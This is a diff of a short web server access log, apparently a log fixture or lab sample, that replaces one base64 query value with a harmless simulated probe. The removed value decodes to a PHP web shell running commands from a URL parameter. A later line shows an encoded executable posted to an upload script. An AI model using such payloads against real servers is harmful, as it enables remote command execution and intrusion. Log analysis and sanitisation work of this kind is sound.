@@ -1,7 +1,7 @@
 192.168.1.10 - - [03/Sep/2026:08:14:02 +0000] "GET /index.html HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 192.168.1.15 - - [03/Sep/2026:08:14:15 +0000] "GET /assets/style.css HTTP/1.1" 200 1204 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
 192.168.1.22 - - [03/Sep/2026:08:15:00 +0000] "GET /api/v1/status HTTP/1.1" 200 89 "-" "curl/7.88.1"
-10.0.4.99 - - [03/Sep/2026:08:16:34 +0000] "POST /api/v1/sync?token=PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ HTTP/1.1" 200 512 "-" "Python-urllib/3.10"
+10.0.4.99 - - [03/Sep/2026:08:16:34 +0000] "POST /api/v1/sync?token=PD9waHAgLyogQjY0TGFiIEF1ZGl0ICovIGVjaG8gJ1NpbXVsYXRlZF9XZWJzaGVsbF9Qcm9iZSc7ID8+ HTTP/1.1" 200 512 "-" "Python-urllib/3.10"
 192.168.1.10 - - [03/Sep/2026:08:17:02 +0000] "GET /favicon.ico HTTP/1.1" 404 182 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 192.168.1.30 - - [03/Sep/2026:08:18:11 +0000] "GET /dashboard HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64)"
 10.0.4.99 - - [03/Sep/2026:08:19:40 +0000] "POST /upload.php?auth=TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
